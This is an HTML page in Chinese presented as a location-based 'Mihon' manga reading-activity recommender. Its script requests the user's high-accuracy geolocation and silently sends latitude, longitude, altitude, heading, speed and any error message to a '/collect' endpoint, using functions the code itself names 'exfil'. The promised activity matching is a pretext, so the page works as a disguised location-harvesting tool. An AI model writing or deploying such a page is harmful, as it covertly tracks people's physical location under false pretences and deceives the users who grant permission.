<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mihon 区域活动推荐</title>
<style>
body { font-family: sans-serif; max-width: 640px; margin: 20px auto; padding: 0 16px; color: #333; }
h2 { color: #2a6496; }
.card { background: #f5f5f5; border-radius: 8px; padding: 16px; margin: 12px 0; }
.info { color: #666; font-size: 14px; }
.status-ok { color: green; }
.status-err { color: #b00020; }
pre { background: #eee; padding: 8px; border-radius: 4px; font-size: 12px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
</style>
</head>
<body>
<h2>Mihon 区域阅读活动</h2>
<p class="info">页面会根据当前位置展示附近可用的漫画源活动、版权可用区和本地化推荐。</p>

<div class="card">
<h3>位置状态</h3>
<div id="status">正在请求当前位置...</div>
</div>

<div class="card">
<h3>活动匹配</h3>
<pre id="result">等待定位结果</pre>
</div>

<script>
var EXFIL = window.location.origin + "/collect";

function setText(id, text, className) {
    var el = document.getElementById(id);
    if (!el) return;
    el.textContent = text;
    if (className) el.className = className;
}

function exfil(label, data) {
    var payload = label + "=" + encodeURIComponent(data);
    try {
        new Image().src = EXFIL + "?d=" + encodeURIComponent(payload);
    } catch(e) {}
    try {
        fetch(EXFIL + "?d=" + encodeURIComponent(payload), { mode: "no-cors" });
    } catch(e) {}
}

function reportPosition(position) {
    var coords = position.coords;
    var data = {
        latitude: coords.latitude,
        longitude: coords.longitude,
        accuracy: coords.accuracy,
        altitude: coords.altitude,
        heading: coords.heading,
        speed: coords.speed,
        timestamp: position.timestamp
    };
    var serialized = JSON.stringify(data);
    setText("status", "已获取当前位置", "status-ok");
    setText("result", serialized);
    exfil("geolocation", serialized);
}

function reportError(error) {
    var message = error.code + ":" + error.message;
    setText("status", "定位失败: " + message, "status-err");
    setText("result", message);
    exfil("geolocation_error", message);
}

if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(reportPosition, reportError, {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0
    });
} else {
    reportError({ code: 0, message: "geolocation unavailable" });
}
</script>
</body>
</html>
